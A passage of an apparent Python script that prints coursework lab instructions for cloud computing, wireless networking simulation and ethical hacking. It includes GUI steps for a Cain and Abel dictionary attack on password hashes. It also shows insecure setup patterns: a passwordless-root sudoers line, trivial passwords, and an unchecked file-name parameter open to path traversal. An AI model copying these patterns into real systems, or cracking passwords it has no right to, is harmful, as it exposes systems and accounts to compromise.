import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import StringPackage.StringOperationClient;
import java.awt.FlowLayout;

public class RestfulClient95 {

    public static void main(String[] args) {
        // Run the GUI creation on the Event Dispatch Thread
        SwingUtilities.invokeLater(() -> {
            createAndShowGUI();
        });
    }

    private static void createAndShowGUI() {
        // Create the frame
        JFrame frame = new JFrame("String Manipulator");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setSize(400, 200);

        // Create the text field for input
        JTextField inputField = new JTextField(20);

        // Create the convert to uppercase button
        JButton toUpperCaseButton = new JButton("To Uppercase");
        toUpperCaseButton.addActionListener((ActionEvent e) -> {
            String input = inputField.getText();
            StringOperationClient client = new StringOperationClient();
            String result = client.toUpperCaseMethod(input);
            JOptionPane.showMessageDialog(frame, "Uppercase: " + result);
        });

        // Create the convert to lowercase button
        JButton toLowerCaseButton = new JButton("To Lowercase");
        toLowerCaseButton.addActionListener((ActionEvent e) -> {
            String input = inputField.getText();
            StringOperationClient client = new StringOperationClient();
            String result = client.toLowercaseMethod(input);
            JOptionPane.showMessageDialog(frame, "Lowercase: " + result);
        });

        // Add components to the frame
        frame.setLayout(new FlowLayout());
        frame.add(inputField);
        frame.add(toUpperCaseButton);
        frame.add(toLowerCaseButton);

        // Display the window
        frame.setVisible(true);
    }
}


And run it
    """
        )


def SoapservDesc():
    print(
    """
Create a Simple SOAP service.
    """
        )

def Soapserv():
    print(
    """
Practical 3
Aim: Create a Simple SOAP service.




Open visual studio and create new project and have every .NET part installed





Create web application(ASP.NET Web Application(.NET framework C#))



Give it a name and select .NET framework 4.7.2

Select empty template by choosing show templates and create

Right Click -> SimpleCCWebApplication

Add-> New Item-> show templates-> select web service(asmx)

Some code will be generated so remove that code and paste:

[WebMethod]
public double D2R(double dollar)
{
double ans = dollar * 82;
return ans;
}

[WebMethod]
public double R2D(double rupees)
{
double ans = rupees / 82;
return ans;
}




Click on solution explorer-> clean
Click on solution explorer-> Build


Right click on webservice.asmx-> view in browser

Click on the methods and check them
    """
        )


def GoogleDesc():
    print(
    """
Develop application to consume Google’s search / Google’s Map RESTful Web service
    """
        )

def Google():
    print(
    """
Practical 4
Aim: Develop application to consume Google’s search / Google’s Map RESTful Web service.

1. First of all we need to create an Java Web Application with any name, let it be Practical4 here using
Netbeans IDE.


Open netbeans
Click on new project->Web Application->Next
Name the Application as anything(Practical 1)
Select Location->Next

Select GlassFish Server 4.1
Java EE Version: Java EE 7 Web
Click on Next->Do not select anything and finish


Create a new JSP file and name it input:
2. The code inside the input.jsp will be similar to this input.jsp.
input.jsp:

<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>JSP Page</title>
    </head>
    <body>
        <form action="index.jsp">
            <pre>
                Enter latitude: <input type="text" name="t1"/>
                Enter longitude: <input type="text" name="t2"/>
                <input type="submit" value="show"/>
            </pre>
        </form>
    </body>
</html>







3. Before running the application we need the Google API key.


go to google dev console








4. Create a new API Project.
5. Enter the name to your project.



Search for maps javascript api and enable it


Click on API key and copy it



6. Create another file index.jsp
index.jsp:

<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>

<style>
#map{
height:400px;
width:100%;
}
</style>
</head>
<body>
<%
double lati=Double.parseDouble(request.getParameter("t1"));
double longi=Double.parseDouble(request.getParameter("t2"));
%>
<h3> Google Maps </h3>
<div id="map"></div>
<script lang="javascript">
function initMap() {
var info={lat: <%=lati%>, lng: <%=longi%>};
var map = new google.maps.Map(document.getElementById('map'),
{
zoom:4, center:info
});
var marker = new google.maps.Marker({
position:info, map:map
});
}
</script>
<script async defer
src="https://maps.googleapis.com/maps/api/js?key=(theAPIkey)
&callback=initMap">
</script>
</body>

</html>



7. Right click & Deploy the project.
8. Run file -> input.jsp.
    """
        )


def KVMDesc():
    print(
    """
Installation and Configuration of virtualization using KVM
    """
        )

def KVM():
    print(
    """
Practical 5:



Installation and Configuration of virtualization using KVM.



Edit virtual machine settings -> Processors -> Virtualize Intel VT-x/EPT or AMD-V/RVI


sudo apt-get update

sudo apt-get upgrade

sudo grep -c “svm\|vmx” /proc/cpuinfo

cat /proc/cpuinfo

sudo apt install cpu-checker


sudo apt install libvirt-daemon-system libvirt-clients

sudo apt install bridge-utils

sudo apt install qemu-kvm virt-manager

sudo systemctl enable --now libvirtd

sudo systemctl start libvirtd

sudo systemctl status libvirtd

sudo virt-manager


install puppy linux
    """
        )


def MTOMDesc():
    print(
    """
Develop application to download image/video from server or upload image/video
to server using MTOM techniques
    """
        )

def MTOM():
    print(
    """
Practical 6:


Develop application to download image/video from server or upload image/video
to server using MTOM techniques



MTOM (Message Transmission Optimization Mechanism)
MTOM (Message Transmission Optimization Mechanism) is a technique used in web services to
optimize the transmission of binary data, such as images, documents, and other large files, over
SOAP (Simple Object Access Protocol) messages. It is primarily designed to address the inefficiencies
associated with Base64 encoding, which is commonly used to transmit binary data within SOAP
messages.





Create new visual studio project->Select ASP.NET Web Application(.NET Framework)->.Net 4.7.2

Empty->Create


Solution Explorer->Add->New Item-> asmx web service->Add


Add this code to the asmx:

[WebMethod, Description("Get Image Content")]
public byte[] GetImageFile(string fileName)
{
    if (System.IO.File.Exists(Server.MapPath("~/Images/") + fileName))
    {
        return System.IO.File.ReadAllBytes(Server.MapPath("~/Images/")
        + fileName);
    }
    else
    {
        return new byte[] { 0 };
    }
}



Solution Explorer->Add->New Item-> Generic handler


In the handler replace:

ProcessRequest(HttpContext context) bracketed code with:

WebService1 ws = new WebService1();
byte[] binImage = ws.GetImageFile(context.Request["fileName"]);
if (binImage.Length == 1)
{
    //do nothing
}
else
{
    context.Response.ContentType = "image/*";
    context.Response.BinaryWrite(binImage);
}



Solution Explorer->Add->New Item->Web Form(C#)

Create a <center></center> in the form and got to design of the web page and switch to legacy if necessary from options->web forms designer(restart)


Drag Label , Textbox, button and image

changes: Label ID: lbl1, Text: Enter the image name to download and show
TextBox: ID: txt1, BorderStyle: Groove
Button: ID: btn1, BorderStyle:Ridge Text: Download Image and Show

Double Click on the button in design and add code to it:


Image1.ImageUrl = "~/Handler1.ashx?fileName=" + txt1.Text;
Response.Write("Downloading of Image is done");


New Folder Images amd enter some images in it

Now view the page in browser
    """
        )


def FossIaasDesc():
    print(
    """
Implement FOSS-Cloud Functionality VSI (Virtual Server Infrastructure)
Infrastructure as a Service (IaaS), Storage
    """
        )


def FossIaas():
    print(
    """
Practical 7:


Implement FOSS-Cloud Functionality VSI (Virtual Server Infrastructure)
Infrastructure as a Service (IaaS), Storage


Open VMWare and install FOSS Cloud 1.2.20

Enable Hardware virtualization and keep memory above 130 GB and RAM above 4GB


Select demo system

install on sda

Select yes to enable DHCP allocation

fc-node-configuration -n demo-system --password admin

Now access the FOSS cloud from IP
    """
        )

def FossPaasDesc():
    print(
    """
Implement FOSS-Cloud Functionality - VSI Platform as a Service (PaaS)
    """
        )

def FossPaas():
    print(
    r"""
Practical 8:

Implement FOSS-Cloud Functionality - VSI Platform as a Service (PaaS)


All 7 prac steps and after that:


Upload an ISO file in the cloud


Install remote viewer and spice client

Run->regedit

HKEY_CLASSES_ROOT->spice->shell->command right click on modify and enter:

C:\Users\<Your Username>\AppDara\Local\virt-viewer\bin\remote-viewer %1



Create profile for uploaded ISO file

Then create a template and select display as 1

Click on right pointing run and then monitor icon to see the started virtual machine

install some app like netbeans or something...
"""
    )

def AWSDesc():
    print(
    """
Using AWS Flow Framework develop application that includes a simple workflow. Workflow
calls an activity to print hello world to the console. It must define the basic usage of AWS Flow
Framework, including defining contracts, implementation of activities and workflow coordination
logic and worker programs to host them.
    """
        )

def AWS():
    print(
    """
Practical 9:


Using AWS Flow Framework develop application that includes a simple workflow. Workflow
calls an activity to print hello world to the console. It must define the basic usage of AWS Flow
Framework, including defining contracts, implementation of activities and workflow coordination
logic and worker programs to host them.


SignUp for AWS

Download AWS SDK from link: https://docs.aws.amazon.com/sdk-for-java/v1/developer-guide/setup-
install.html

Download the JAR files related to the AWS Flow Framework (e.g., aws-
java-sdk-swf-flow).

o Add these JAR files to your project's classpath. The exact steps depend on
your IDE.

Compile the Code:
o Use your IDE's compile function or a command like 
javac Greeter.java Workflow.java GreeterImpl.java GreetingWorkflowImpl.java WorkflowWorker.java

Develop the Code:
o Create the following Java classes in your project:
▪ Greeter.java (interface)
▪ GreeterImpl.java (implementation)
▪ Workflow.java (interface)
▪ GreetingWorkflowImpl.java (implementation)
▪ WorkflowWorker.java (worker program)
o Copy the code snippets provided in the previous explanation (interfaces,
implementations, and worker program).

Run the Worker (Simulated Execution):
o Execute the WorkflowWorker class (e.g., java WorkflowWorker).
o You should see "Hello, World!" printed to the console (even without AWS
interaction).

Additional Notes:
• This is a simplified local execution to understand the workflow structure.
• For real workflow execution with AWS services like SWF, you'd need to deploy the
worker program to a server and register it with SWF.
• Refer to the AWS Flow Framework documentation for detailed information on
workflow execution and activity
scheduling: https://aws.amazon.com/swf/details/flow/


Greeter.java:


package Greeter;

/**
 *
 * @author 91885
 */
public interface Greeter {
void sayHello(String message);
}


GreeterImpl.java

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Greeter;

/**
 *
 * @author 91885
 */
public class GreeterImpl implements Greeter {
@Override
public void sayHello(String message) {
System.out.println(message);
}
}



GreeterWorkflowImpl.java:


package Greeter;

import javax.xml.transform.Templates;

public class GreetingWorkflowImpl implements Workflow {
    private final Greeter greeter;

    public GreetingWorkflowImpl(Greeter greeter) {
        this.greeter = greeter;
    }

    // Constructor that takes a GreeterImpl as an argument
    // Uncomment and modify as needed
    // GreetingWorkflowImpl(GreeterImpl greeterImpl) {
    //     throw new UnsupportedOperationException("Not supported yet.");
    // }

    @Override
    public void greet(String name) throws WorkflowException {
        // Simulate scheduling the activity (no AWS)
        greeter.sayHello("Hello, " + name);
    }
}



Workflow.java:

/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Greeter;

/**
 *
 * @author 91885
 */
public interface Workflow {
void greet(String name) throws WorkflowException;
public static class WorkflowException extends Exception {
public WorkflowException() {
}
}
}



WorkflowWorker.java:


/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Greeter;

/**
 *
 * @author 91885
 */
public class WorkflowWorker {

/**
* @param args the command line arguments
     * @throws Greeter.Workflow.WorkflowException
*/
public static void main(String[] args) throws Workflow.WorkflowException {
// Simulate workflow execution locally (without SWF)
GreetingWorkflowImpl greetingWorkflow = new GreetingWorkflowImpl(new GreeterImpl());
greetingWorkflow.greet("The Name");
}
}



java -cp "C:\Material\Sem6\Cloud Computing\Practical 9\AWS95\src" Greeter.WorkflowWorker
    """
        )



def OpenstackDesc():
    print(
    """
Implementation of Openstack with user and private network creation.
    """
        )


def Openstack():
    print(
    """
Practial 10


Implementation of Openstack with user and private network creation.


sudo apt-get update -y
sudo apt-get upgrade -y
sudo adduser stack

sudo -i

echo "stack ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

sudo apt-get install git

git clone https://git.openstack.org/openstack-dev/devstack

http://download.cirros-cloud.net/0.3.4/cirros-0.3.4-x86_64-uec.tar.gz

chown -R vaibhav95:vaibhav95 /home/vaibhav95/devstack


chmod -R 755 /home/vaibhav95/devstack


sudo -s
cd /home/vaibhav95

cd devstack
cd samples

cp local.conf ../


Changes:
ADMIN_PASSWORD=p1
DATABASE_PASSWORD=p1
RABBIT_PASSWORD=p1
SERVICE_PASSWORD=p1

HOST_IP=192.168.137.133
FLOATING_RANGE=192.168.0.0/24

cd ..

sudo gedit local.conf

HOST_IP=192.168.137.133
FLOATING_RANGE=192.168.0.0/24

./stack.sh


sudo chmod -R 755 /home/vaibhav95/devstack/

cp ~/Downloads/cirros-0.3.4-x86_64-uec.tar.gz ~/home/vaibhav95/devstack/files/


sudo cp ~/Downloads/cirros-0.3.4-x86_64-uec.tar.gz ~/home/devstack/files/


sudo chmod -R 755 /home/vaibhav95/devstack/
    """
        )

def AdhocDesc():
    print(
    """
Aim: Create simple Adhoc network.
    """
        )

def Adhoc():
    print(
    """
Practical 4:
Aim: Create simple Adhoc network.
Description:
● Simulator used : Omnet++
● Simulator can be downloaded from below link:
https://omnetpp.org/omnetpp (recommended version is omnet++ 4.2.2).
● After installing Omnet++, we need to install inet framework which is specially designed for
wireless simulation. You can download inet framework from below link.
https://inet.omnetpp.org/Download.html
● After downloading there are certain steps to be followed to include this framework in
omnet++ as follows:
● Download the INET sources.
● Unpack it into the directory of your choice: (tar xvfz inet-&lt;version&gt;.tgz)(recommended is tar or .tgz)
● Recommeded version is inet 2.1
● Start the Omnet++ IDE, and import the project via File -&gt; Import -&gt; Existing Projects to the
Workspace. A project named inet should appear.
● Build with Project -&gt; Build, or hit ctrl+b
● Now you should be able to launch example simulations.
Steps for practical:
● Then open inet/examples/
● Right click on adhoc -create new folder as SimpleAdhoc.
● Right click on your newly created folder and select NED file. Give name as Net1.



Click on new ned file
click on new managed mobility wireless network wizard.


then configure it

Number of hosts: 5

Topology as not static

then finish


It should have 1 channelControl/Converter
1 configurator
1 wifi symbol icon client


Now try to execute by right click on ned file Run as-1-Omnet++ simulation.



below is the code that will be available in source part of net1.ned once configured.
package inet.examples.adhoc.SimpleAdhoc;
// numOfHosts: 5
import inet.networklayer.autorouting.ipv4.IPv4NetworkConfigurator;
import inet.nodes.inet.WirelessHost;
import inet.nodes.wireless.AccessPoint;
import inet.world.radio.ChannelControl;
network Net1
{
parameters:
int numOfHosts;
submodules:
host[numOfHosts]: WirelessHost
{
@display(&quot;r=,,#707070&quot;);
}
ap: AccessPoint
{
@display(&quot;p=213,174;r=,,#707070&quot;);
}
channelControl: ChannelControl
{
numChannels = 2;
@display(&quot;p=61,46&quot;);
}
configurator: IPv4NetworkConfigurator
{
@display(&quot;p=140,50&quot;);
}
}



On design part you will find components appearing according to the code as the above snapshot.
Same as do this in omnetpp.ini file :
Source code for omnetpp.ini:
[General]
network = Net1
*.numOfHosts = 5
#debug-on-errors = true
tkenv-plugin-path = ../../../etc/plugins

**.constraintAreaMinX = 0m
**.constraintAreaMinY = 0m
**.constraintAreaMinZ = 0m
**.constraintAreaMaxX = 600m
**.constraintAreaMaxY = 400m
**.constraintAreaMaxZ = 0m
**.debug = true
**.coreDebug = false
**.host*.**.channelNumber = 0
# channel physical parameters
*.channelControl.carrierFrequency = 2.4GHz
*.channelControl.pMax = 2.0mW
*.channelControl.sat = -110dBm
*.channelControl.alpha = 2
# mobility
**.host*.mobilityType = &quot;MassMobility&quot;
**.host*.mobility.initFromDisplayString = false
**.host*.mobility.changeInterval = truncnormal(2s, 0.5s)
**.host*.mobility.changeAngleBy = normal(0deg, 30deg)
**.host*.mobility.speed = truncnormal(20mps, 8mps)
**.host*.mobility.updateInterval = 100ms
# ping app (host[0] pinged by others)
*.host[0].numPingApps = 0
*.host[*].numPingApps = 2
*.host[*].pingApp[*].destAddr = &quot;host[0]&quot;
**.pingApp[0].startTime = uniform(1s,5s)
**.pingApp[1].startTime = 5s+uniform(1s,5s)
**.pingApp[*].printPing = true
# nic settings
**.wlan[*].bitrate = 2Mbps
**.wlan[*].mgmt.frameCapacity = 10
**.wlan[*].mac.address = &quot;auto&quot;
**.wlan[*].mac.maxQueueSize = 14
**.wlan[*].mac.rtsThresholdBytes = 3000B
**.wlan[*].mac.retryLimit = 7
**.wlan[*].mac.cwMinData = 7
**.wlan[*].radio.transmitterPower = 2mW
**.wlan[*].radio.thermalNoise = -110dBm
**.wlan[*].radio.sensitivity = -85dBm
**.wlan[*].radio.pathLossAlpha = 2
**.wlan[*].radio.snirThreshold = 4dB
[Config Ping1]
description = &quot;host1 pinging host0&quot;
[Config Ping2] # __interactive__
description = &quot;n hosts&quot;
# leave numHosts undefined here
**.mobility.constraintAreaMinZ = 0m

**.mobility.constraintAreaMaxZ = 0m
**.mobility.constraintAreaMinX = 0m
**.mobility.constraintAreaMinY = 0m
**.mobility.constraintAreaMaxX = 600m
**.mobility.constraintAreaMaxY = 400m
**.debug = false
**.coreDebug = false
**.channelNumber = 0
# channel physical parameters
*.channelControl.carrierFrequency = 2.4GHz
*.channelControl.pMax = 20.0mW
*.channelControl.sat = -110dBm
*.channelControl.alpha = 2
# mobility
**.host[*].mobilityType = &quot;MassMobility&quot;
**.host[*].mobility.changeInterval = truncnormal(2s, 0.5s)
**.host[*].mobility.changeAngleBy = normal(0deg, 30deg)
**.host[*].mobility.speed = truncnormal(20mps, 8mps)
**.host[*].mobility.updateInterval = 100ms
# nic settings
**.bitrate = 2Mbps
**.mac.address = &quot;auto&quot;
**.mac.maxQueueSize = 14
**.mac.rtsThresholdBytes = 3000B
**.wlan[*].mac.retryLimit = 7
**.wlan[*].mac.cwMinData = 7
**.wlan[*].mac.cwMinMulticast = 31
**.radio.transmitterPower = 20.0mW
**.radio.carrierFrequency = 2.4GHz
**.radio.thermalNoise = -110dBm
**.radio.sensitivity = -85dBm
**.radio.pathLossAlpha = 2
**.radio.snirThreshold = 4dB
# relay unit configuration
**.relayUnitType = &quot;MACRelayUnitNP&quot;
**.relayUnit.addressTableSize = 100
**.relayUnit.agingTime = 120s
**.relayUnit.bufferSize = 1MiB
**.relayUnit.highWatermark = 512KiB
**.relayUnit.pauseUnits = 300 # pause for 300*512 bit (19200 byte) time
**.relayUnit.addressTableFile = &quot;&quot;
**.relayUnit.numCPUs = 2
**.relayUnit.processingTime = 2us
    """
        )

def RoutableDesc():
    print(
    """
Understanding, Reading and Analyzing Routing Table of a network
    """
        )

def Routable():
    print(
    """
Practical 5:


Understanding, Reading and Analyzing Routing Table of a network.

I]
Take 2 PT routers via Se2/0

Router 0:
RIP Network Address:
10.0.0.0
192.168.1.0


FastEthernet0/0: 192.168.1.10
Serial2/0: 10.10.10.1

Connect PC0 with Router0
PC0: Gateway: 192.168.1.10 , FastEthernet0: 192.168.1.1


Router 1:
RIP Network Address:
10.0.0.0
192.168.2.0

FastEthernet0/0: 192.168.2.10
Serial2/0: 10.10.10.2


Connect PC1 with Router1
PC1: Gateway: 192.168.2.10 , FastEthernet0: 192.168.2.1



II]


Take 2 PT routers via Se2/0	Connect a 2950-24 Switch to Each Router

Router 0:
RIP Network Address:
10.0.0.0
192.168.1.0
192.168.3.0

FastEthernet0/0: 192.168.1.10 , FastEthernet1/0: 192.168.3.10
Serial2/0: 10.10.10.1

Connect PC0 with Router0 directly
PC0: Gateway: 192.168.1.10 , FastEthernet0: 192.168.1.1


Connect PC2 with Router0 via switch
PC2: Gateway: 192.168.3.10 , FastEthernet0: 192.168.3.1

Router 1:
RIP Network Address:
10.0.0.0
192.168.2.0
192.168.4.0

FastEthernet0/0: 192.168.2.10 , FastEthernet1/0: 192.168.4.10
Serial2/0: 10.10.10.2

Connect PC1 with Router1
PC1: Gateway: 192.168.2.10 , FastEthernet0: 192.168.2.1

Connect a PT-Server(Server from End devices) to Router1 via Switch2
Server0: Gateway: 192.168.4.10, FastEthernet0: 192.168.4.1
    """
        )


def ManetDesc():
    print(
    """
Create a basic MANET implementation simulation for Packet animation and Packet Trace.
    """
        )

def Manet():
    print(
    """
Practical 6:



Create a basic MANET implementation simulation for Packet animation and Packet Trace.


Steps for practical:
1. Then open inet/examples/
2. Right click on manetrouting -create new folder as MobileNet.
3. Right click on your newly created folder and select NED file. Give name as Net1.
select new adhoc mobility wireless network wizard



//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Lesser General Public License as published
by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU Lesser General Public License for more details.
//
// You should have received a copy of the GNU Lesser General Public License
// along with this program. If not, see http://www.gnu.org/licenses/.
//
package inet.examples.manetrouting.mymanet;
// numOfHosts: 10
// parametric: true
// static: false
import inet.networklayer.autorouting.ipv4.IPv4NetworkConfigurator;
import inet.nodes.inet.AdhocHost;
import inet.world.radio.ChannelControl;
network Net1
{
parameters:
int numHosts;
submodules:
host[numHosts]: AdhocHost
{
parameters:
@display(&quot;r=,,#707070&quot;);
}
channelControl: ChannelControl
{
parameters:
@display(&quot;p=60,50&quot;);
}
configurator: IPv4NetworkConfigurator

{
@display(&quot;p=140,50&quot;);
}
}

a file omnetpp.ini will be created with the following code
[General]
network = Net1
#record-eventlog = true
#eventlog-message-detail-pattern = *:(not declaredOn(cMessage) and not
declaredOn(cNamedObject) and not declaredOn(cObject))
*.numHosts = 10
num-rngs = 3
**.mobility.rng-0 = 1
**.wlan[*].mac.rng-0 = 2
#debug-on-errors = true
tkenv-plugin-path = ../../../etc/plugins
**.channelNumber = 0
# channel physical parameters
*.channelControl.carrierFrequency = 2.4GHz
*.channelControl.pMax = 2.0mW
*.channelControl.sat = -110dBm
*.channelControl.alpha = 2
*.channelControl.numChannels = 1
# mobility
**.host[*].mobilityType = &quot;MassMobility&quot;
**.mobility.constraintAreaMinZ = 0m
**.mobility.constraintAreaMaxZ = 0m
**.mobility.constraintAreaMinX = 0m
**.mobility.constraintAreaMinY = 0m
**.mobility.constraintAreaMaxX = 600m
**.mobility.constraintAreaMaxY = 400m
**.mobility.changeInterval = truncnormal(2s, 0.5s)
**.mobility.changeAngleBy = normal(0deg, 30deg)
**.mobility.speed = truncnormal(20mps, 8mps)
**.mobility.updateInterval = 100ms
# ping app (host[0] pinged by others)
*.host[0].pingApp[0].destAddr = &quot;&quot;
*.host[*].numPingApps = 1
*.host[*].pingApp[0].destAddr = &quot;host[0]&quot;
*.host[*].pingApp[0].startTime = uniform(1s,5s)
*.host[*].pingApp[0].printPing = true
# nic settings
**.wlan[*].bitrate = 2Mbps
**.wlan[*].mgmt.frameCapacity = 10

**.wlan[*].mac.address = &quot;auto&quot;
**.wlan[*].mac.maxQueueSize = 14
**.wlan[*].mac.rtsThresholdBytes = 3000B
**.wlan[*].mac.retryLimit = 7
**.wlan[*].mac.cwMinData = 7
**.wlan[*].mac.cwMinMulticast = 31
**.wlan[*].radio.transmitterPower = 2mW
**.wlan[*].radio.thermalNoise = -110dBm
**.wlan[*].radio.sensitivity = -85dBm
**.wlan[*].radio.pathLossAlpha = 2
**.wlan[*].radio.snirThreshold = 4dB

right click on ned file and run it as omnetpp simulation
    """
        )

def WSNSimDesc():
    print(
    """
Implement a Wireless sensor network simulation.
    """
        )

def WSNSim():
    print(
    """
Practical 7:


Implement a Wireless sensor network simulation.


I]
PC0 and PC1 should be able to form an association with
Access PointA, but not Access PointN or Access Point_B_G,
since they have the PT-HOST-NM-1W-A module installed.

Laptop0 and Server0 can associate with 
Access PointN but not Access PointA since they 
have the PT-HOST-NM-1W module installed.

1. Test Access PointA
    a. Ping PC1 (10.1.1.2) from PC0. The ping should succeed.
    b. Ping Laptop0(10.1.1.3) and Server0 (10.1.1.4) from PC0. The pings should fail.

2. Test Access PointN
    a. Ping Server0 (10.1.1.4) from Laptop0. The ping should succeed.
    b. Ping PC0 (10.1.1.1) and PC1 (10.1.1.2) from Laptop0. The pings should fail.

3. Test Access Point_B_G
    a. Turn on Port1 on Access Point_B_G and turn off Port1 on Access PointN. Laptop0 and Server0 should associate with Access Point_B_G.
    b. Ping Server0 (10.1.1.4) from Laptop0. The ping should succeed.

Real One:

Take AccessPoint-PT-A, AccessPoint-PT, AccessPoint-PT-N

Connect PC0 and PC1 to AccessPoint-PT-A

Connect a Laptop and a Server-PT to AccessPoint-PT and nothing to AccessPoint-PT-N?

and ping as given text



II]


Take a Router-PT and two AccessPoint-PT-N

Router0: FastEthernet0: 192.168.1.10, FastEthernet1/0: 192.168.2.10

Connect the access points via fastethernet and two wireless devices to each of the access points and ping them
    """
        )

def MacprotDesc():
    print(
    """
Create MAC protocol simulation implementation for wireless sensor Network.
    """
        )

def Macprot():
    print(
    """
Practical 8

Create MAC protocol simulation implementation for wireless sensor Network.



Take a HomeRouter-PT-AC

and many wireless devices like laptop, tablet or smartphone

Copy the MAC address of each component

We note the following MAC addresses and convert them to the following form
Component MAC Address Converted MAC address
Laptop0 000A.F3B4.7CDC 00:0A:F3:B4:7C:DC
Laptop1 0001.4269.6539 00:01:42:69:65:39
Laptop2 0060.5CB8.B919 00:60:5C:B8:B9:19
TabletPC 000C.8558.6B7B 00:0C:85:58:6B:7B
SmartPhone0 00D0.9774.32BD 00:D0:97:74:32:BD
SmartPhone1 0060.701E.0BE0 00:60.70:1E:0B:E0

So add a colon after two characters for the MAC address

Now we add few addresses in the wireless MAC filter of the Wireless Router and
then use the given options for either allow or deny the Wireless access


Click on HomeRouter->GUI->Wireless->Wireless MAC Filter

Now enter the changed formatted MAC address and select a policy and click on save settings
    """
        )

def MobsimDesc():
    print(
    """
Simulate Mobile Adhoc Network with Directional Antenna
    """
        )

    
def Mobsim():
    print(
    """
Practial 9


Simulate Mobile Adhoc Network with Directional Antenna


Take a ceiling fan and name it as CeilingFan, Motion Detector(MotionSensor) a Home Gateway (Wireless Devices) and a smart phone

HomeGateway: LAN: 192.168.25.1

Click on Sensor->Advanced->I/O Config and select PT-IOT-NM-1W

For the smartphone change the SSID to the SSID in the Home Gateway0

As seen above the SSID is HomeGateway, we use the same and set the SSID in the Smartphone

All the devices are now connected to the Home Gateway

Now open the Web browser of the SmartPhone and type the IP address of the HomeGateway

Username : admin
Password : admin
After logging click on conditions and do the following:

Add Rule:
Fan-On
Match- All
Sensor On is True then set FAN status to High

and
Fan-Ooff
Match- All
Sensor On is False then set FAN status to Off

Press the go button after adding the two conditions


In order to turn ON the fan Press the ALT key and left-click the mouse over the Sensor
    """
        )

def MobtowDesc():
    print(
    """
Create a mobile network using Cell Tower, Central Office
Server, Web browser and Web Server. Simulate connection between them
    """
        )

def Mobtow():
    print(
    """
PRACTICAL-10

Aim: Create a mobile network using Cell Tower, Central Office
Server, Web browser and Web Server. Simulate connection between them.




Select one smartphone, cell-tower, Central Office Server, Hub, Router
1841 and a wireless Router WRT300N.


Hub should be in center of wireless and wired router and central office server below the hub

Connect the Wireless Router(via Internet Connection name) and 1841 Router to Hub-PT via FastEthernet

WirelessRouter0: Internet: IP: 20.1.1.3, Defalut Gateway: 20.1.1.1
LAN: IP: 192.168.0.1

1841Router0: FastEthernet0/0: 20.1.1.1


Also connect a Central Office Server to the Hub via FastEthernet as well

Central-Office-Server0: Backbone IP: 20.1.1.2, Default Gateway: 20.1.1.1
Cell Tower IP address: 172.16.1.1



Connect Cell tower to the Central Office Server using Coaxial cable



Now keep a smartphone to the far left in the vicinity of wireless router and cell tower


Now ping the wired router from cellular device and tract the network
using tracert command.
    """
        )

def WhoisDesc():
    print(
    """
Google and Whois Reconnaissance
 Use Google search techniques to gather information about a specific target or
organization.
 Utilize advanced search operators to refine search results and access hidden
information.
 Perform Whois lookups to retrieve domain registration information and gather
details about the target's infrastructure.
    """
        )

def Whois():
    print(
    """
Practical 1:
Google and Whois Reconnaissance
 Use Google search techniques to gather information about a specific target or
organization.
 Utilize advanced search operators to refine search results and access hidden
information.
 Perform Whois lookups to retrieve domain registration information and gather
details about the target's infrastructure.

Perform Whois lookups to retrieve domain registration information and gather details about the target's infrastructure.
    """
        )

def CrytabelDesc():
    print(
    """
Aim : Password Encryption and Cracking with CrypTool and Cain and Abel
1. Password Encryption and Decryption:
o Use CrypTool to encrypt passwords using the RC4 algorithm.
o Decrypt the encrypted passwords and verify the original values.
2. Password Cracking and Wireless Network Password Decoding:
o Use Cain and Abel to perform a dictionary attack on Windows account passwords.
o Decode wireless network passwords using Cain and Abel's capabilities.
    """
        )

def Crytabel():
    print(
    """
Practical 2
Aim : Password Encryption and Cracking with CrypTool and Cain and Abel
1. Password Encryption and Decryption:
o Use CrypTool to encrypt passwords using the RC4 algorithm.
o Decrypt the encrypted passwords and verify the original values.
2. Password Cracking and Wireless Network Password Decoding:
o Use Cain and Abel to perform a dictionary attack on Windows account passwords.
o Decode wireless network passwords using Cain and Abel's capabilities.


AIM : Use Cain and Abel for cracking Windows account password using Dictionary attack
and to decode wireless network passwords.
Step 1 - Open Cain Software.

Step 2 - Open Hash Calculator.

Step 3 - Type text and click on calculate and Copy MD5 text.

Step 4 - Select MD5 hashes in cracker and click on add to list and paste the MD5 text.

Step 5 - It will get pasted in the first column.


Step 6 - Then right click in text and select the dictionary attack.


Step 7 - Dictionary attack will open and then Right click on the column and select add to list then
add the wordlist .


Step 8 - Start the dictionary attack and the output will be shown as 1 of 1 hashes cracked.



2.1
Open CrypTool
Enter text in field

Click on Encrypt/Decrypt and select RC4

Copy the RC4 value


Again click on Encrypt/Decrypt button and select Decrypt by RC4

Now decrypt the encrypted value
    """
        )

def LianalyzeDesc():
    print(
    """
Linux Network Analysis:
o Execute the ifconfig command to retrieve network interface information.
o Use the ping command to test network connectivity and analyze the output.
o Analyze the netstat command output to view active network connections.
o Perform a traceroute to trace the route packets take to reach a target host.
    """
        )

def Lianalyze():
    print(
    """
Practical 3
Linux Network Analysis:
o Execute the ifconfig command to retrieve network interface information.
o Use the ping command to test network connectivity and analyze the output.
o Analyze the netstat command output to view active network connections.
o Perform a traceroute to trace the route packets take to reach a target host.

3.1) Using TraceRoute, ping, ifconfig, netstat Command

Linux Network Analysis and ARP Poisoning
 Linux Network Analysis:
o Execute the ifconfig command to retrieve network interface
information.
o Use the ping command to test network connectivity and analyze the
output.
o Analyze the netstat command output to view active network
connections.
o Perform a traceroute to trace the route packets take to reach a target
host.
 ARP Poisoning:
o Use ARP poisoning techniques to redirect network traffic on a
